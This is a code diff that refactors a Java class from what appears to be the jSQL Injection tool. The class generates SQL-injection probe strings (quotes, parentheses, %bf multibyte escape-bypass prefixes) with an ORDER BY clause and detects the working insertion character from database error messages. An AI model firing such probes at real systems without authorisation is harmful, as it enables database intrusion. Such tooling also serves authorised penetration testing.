@@ -1,6 +1,7 @@
 package com.jsql.model.suspendable;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.CompletionService;
 import java.util.concurrent.ExecutionException;
@@ -51,38 +52,9 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
         ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
         CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
 
-        List<String> charactersInsertion = new ArrayList<>();
-        for (String prefix: new String[]{"-1", "0", "1", ""}) {
-            
-            for (String suffix: new String[]{
-                "prefix",
-                "prefix'", "'prefix'",
-                "prefix\"", "\"prefix\"",
-                "prefix%bf'", "%bf'prefix%bf'",
-                "prefix%bf\"", "%bf\"prefix%bf\""
-            }) {
-                
-                for (String suffix2: new String[]{"", ")", "))"}) {
-                    
-                    charactersInsertion.add(suffix.replace("prefix", prefix) + suffix2);
-                }
-            }
-        }
-        
-        for (String insertionCharacter: charactersInsertion) {
-            
-            taskCompletionService.submit(
-                new CallablePageSource(
-                    insertionCharacter
-                    + " "
-                    + this.injectionModel.getMediatorVendor().getVendor().instance().sqlOrderBy(),
-                    insertionCharacter,
-                    this.injectionModel
-                )
-            );
-        }
+        List<String> charactersInsertion = this.initializeCallables(taskCompletionService);
 
-        String characterInsertion = null;
+        String characterInsertionDetected = null;
         
         int total = charactersInsertion.size();
         while (0 < total) {
@@ -105,7 +77,7 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
                     // the correct character: postgresql
                     Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                 ) {
-                    characterInsertion = currentCallable.getInsertionCharacter();
+                    characterInsertionDetected = currentCallable.getCharacterInsertion();
                     break;
                 }
             } catch (InterruptedException | ExecutionException e) {
@@ -127,23 +99,68 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
             Thread.currentThread().interrupt();
         }
         
-        if (characterInsertion == null) {
-            
-            if (StringUtils.isEmpty(characterInsertionByUser) || InjectionModel.STAR.equals(characterInsertionByUser)) {
-                characterInsertion = "1";
-            } else {
-                characterInsertion = characterInsertionByUser;
-            }
-            LOGGER.warn("No character insertion activates ORDER BY error, forcing to ["+ characterInsertion.replace(InjectionModel.STAR, "") +"]");
-            
-        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, "").equals(characterInsertion)) {
-            
-            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, "");
-            LOGGER.debug("Found character insertion ["+ characterInsertion +"] in place of ["+ characterInsertionByUserFormat +"] to detect error on ORDER BY");
-            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
-        }
+        characterInsertionDetected = this.initializeCharacterInsertion(characterInsertionByUser, characterInsertionDetected);
 
         // TODO optional
-        return characterInsertion;
+        return characterInsertionDetected;
+    }
+
+    private List<String> initializeCallables(CompletionService<CallablePageSource> taskCompletionService) {
+        
+        List<String> roots = Arrays.asList("-1", "0", "1", "");
+        List<String> prefixes = Arrays.asList(
+                "prefix",
+                "prefix'", "'prefix'",
+                "prefix\"", "\"prefix\"",
+                "prefix%bf'", "%bf'prefix%bf'",
+                "prefix%bf\"", "%bf\"prefix%bf\""
+            );
+        List<String> suffixes = Arrays.asList("", ")", "))");
+        
+        List<String> charactersInsertion = new ArrayList<>();
+        
+        for (String root: roots) {
+            for (String prefix: prefixes) {
+                for (String suffix: suffixes) {
+                    charactersInsertion.add(prefix.replace("prefix", root) + suffix);
+                }
+            }
+        }
+        
+        for (String characterInsertion: charactersInsertion) {
+            
+            taskCompletionService.submit(
+                new CallablePageSource(
+                    characterInsertion
+                    + " "
+                    + this.injectionModel.getMediatorVendor().getVendor().instance().sqlOrderBy(),
+                    characterInsertion,
+                    this.injectionModel
+                )
+            );
+        }
+        
+        return charactersInsertion;
+    }
+
+    private String initializeCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
+        
+        if (characterInsertionDetected == null) {
+            
+            if (StringUtils.isEmpty(characterInsertionByUser) || InjectionModel.STAR.equals(characterInsertionByUser)) {
+                characterInsertionDetected = "1";
+            } else {
+                characterInsertionDetected = characterInsertionByUser;
+            }
+            LOGGER.warn("No character insertion activates ORDER BY error, forcing to ["+ characterInsertionDetected.replace(InjectionModel.STAR, "") +"]");
+            
+        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, "").equals(characterInsertionDetected)) {
+            
+            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, "");
+            LOGGER.debug("Found character insertion ["+ characterInsertionDetected +"] in place of ["+ characterInsertionByUserFormat +"] to detect error on ORDER BY");
+            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
+        }
+        
+        return characterInsertionDetected;
     }
 }
